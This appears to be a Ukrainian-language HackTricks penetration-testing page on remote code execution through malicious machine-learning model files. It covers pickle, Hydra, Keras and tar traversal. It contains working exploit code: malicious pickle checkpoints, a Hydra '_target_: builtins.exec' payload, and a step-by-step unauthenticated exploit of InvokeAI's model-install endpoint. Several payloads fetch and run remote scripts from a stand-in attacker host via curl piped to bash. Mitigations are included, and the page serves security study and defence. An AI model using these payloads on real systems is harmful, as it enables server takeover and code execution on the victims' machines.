# Моделі RCE

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюють у різних форматах, таких як ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть бути завантажені на машини розробників або в production-системи для використання. Зазвичай моделі не повинні містити шкідливого коду, але є випадки, коли модель може бути використана для виконання довільного коду на системі як задумана функція або через вразливість у бібліотеці завантаження моделей.

На момент написання наведено кілька прикладів такого типу вразливостей:

| **Фреймворк / Інструмент** | **Вразливість (CVE, якщо є)**                                                                                    | **Вектор RCE**                                                                                                                         | **Посилання**                                |
|-----------------------------|------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                  | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                      | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                              | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                      | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                   | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker          | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                           | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code        | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                               | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                    | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                 | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                   | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                         | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                         | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                              | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                              | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують python pickle-орієнтовані моделі, наприклад ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть бути використані для виконання довільного коду на системі, якщо їх не завантажувати з параметром `weights_only=True`. Отже, будь-яка модель на основі pickle може бути особливо вразливою до такого роду атак, навіть якщо вона не згадана в таблиці вище.

### Hydra metadata → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який dotted `_target_` у конфігураційному/метаданому об'єкті. Коли бібліотеки підставляють **untrusted model metadata** у `instantiate()`, атакуючий може надати callable та аргументи, які виконуються негайно під час завантаження моделі (pickle не потрібен).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Викликається перед ініціалізацією моделі в NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.
- Чорний список рядків Hydra можна обійти через альтернативні шляхи імпорту (наприклад, `enum.bltns.eval`) або через імена, що розв'язуються додатком (наприклад, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok також парсить метадані у вигляді рядків за допомогою `ast.literal_eval`, що дозволяє DoS (вибухове зростання використання CPU/пам'яті) до виклику Hydra.

### 🆕  InvokeAI RCE через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний open-source веб-інтерфейс для Stable-Diffusion. Версії **5.3.1 – 5.4.2** надають REST endpoint `/api/v2/models/install`, який дозволяє користувачам завантажувати моделі з довільних URL і завантажувати їх у додаток.

Внутрішньо ця кінцева точка зрештою викликає:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли наданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **pickle deserialization**. Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, атакувальник може вставити всередину checkpoint шкідливий об'єкт із власним методом `__reduce__`; цей метод виконується **during deserialization**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Вразливості було присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова експлуатація

1. Створіть шкідливий checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері під вашим контролем (e.g. `http://ATTACKER/payload.ckpt`).
3. Спровокуйте вразливий endpoint (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → запускається гаджет `os.system` і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує увесь процес.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)  
•  `/api/v2/models/install` доступний зловмиснику  
•  Процес має права на виконання shell-команд

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – патч встановлює `scan=True` за замовчуванням і виконує malware scanning перед десеріалізацією.  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` або новий допоміжний [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Enforce allow-lists / signatures для джерел моделей і запускайте сервіс з найменшими привілеями.

> ⚠️ Пам'ятайте, що **будь-який** Python pickle-based формат (включаючи багато `.pt`, `.pkl`, `.ckpt`, `.pth` файлів) за своєю суттю небезпечний для десеріалізації з ненадійних джерел.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA (частина Merlin) містив небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, checkpoint, контрольований зловмисником, може виконати довільний код через reducer під час десеріалізації.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: У Python `pickle` об'єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає викликабельний об'єкт та аргументи. Цей викликабельний об'єкт виконується під час десеріалізації (unpickling). Якщо такий об'єкт присутній у checkpoint, він виконається ще до використання ваг.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Вектори доставки та радіус ураження:
- Троянізовані checkpoints/models, поширювані через repos, buckets або artifact registries
- Автоматизовані resume/deploy pipelines, які автоматично завантажують checkpoints
- Виконання відбувається всередині training/inference workers, часто з підвищеними привілеями (наприклад, root у контейнерах)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий `torch.load()` на обмежений, allow-listed десеріалізатор, реалізований у `transformers4rec/utils/serialization.py`. Новий лоадер валідуює типи/поля і запобігає виклику довільних callable під час завантаження.

Захисні рекомендації, специфічні для PyTorch checkpoints:
- Не застосовуйте unpickle до недовірених даних. Віддавайте перевагу невиконуваним форматам, таким як [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX, коли це можливо.
- Якщо необхідно використовувати PyTorch serialization, переконайтеся, що `weights_only=True` (підтримується в новіших версіях PyTorch) або використовуйте кастомний allow-listed unpickler, подібний до патчу Transformers4Rec.
- Забезпечуйте provenance/підписи моделі та десеріалізацію в пісочниці (seccomp/AppArmor; non-root user; обмежена файлова система і відсутність виходу в мережу).
- Моніторьте наявність несподіваних дочірніх процесів від ML-сервісів під час завантаження чекпойнту; трасуйте використання `torch.load()`/`pickle`.

POC та посилання на уразливості/патчі:
- Уразливий pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- POC шкідливого checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Приклад – створення шкідливої моделі PyTorch

- Створіть модель:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажити модель:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD відкриває endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений нападник може змусити жертву завантажити шкідливу сторінку/файл, змусити її відправити створений серіалізований blob до цього endpoint і спричинити десеріалізацію як `root`, що призводить до повного скомпрометування.

Сценарій експлуатації відповідає типовому зловживанню pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.


## Моделі для Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI frameworks, базуються на архівах, зазвичай `.zip`. Тому може бути можливо зловживати цими форматами для виконання path traversal атак, що дозволяє читати довільні файли з системи, де модель завантажується.

Наприклад, з наступним кодом ви можете створити модель, яка створить файл у директорії `/tmp` під час завантаження:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або, за допомогою наступного коду ви можете створити модель, яка при завантаженні створить symlink на каталог `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Поглиблений огляд: Keras .keras deserialization і gadget hunting

Для цілеспрямованого керівництва щодо .keras internals, Lambda-layer RCE, проблеми довільного імпорту в ≤ 3.8 та post-fix gadget discovery усередині allowlist дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Джерела

- [Блог OffSec – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Документація модуля Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – зауваження щодо безпеки для torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [Блог ZDI – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [Оповіщення ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Уразливий loader до патчу (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Зловмисний checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Loader після патчу (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
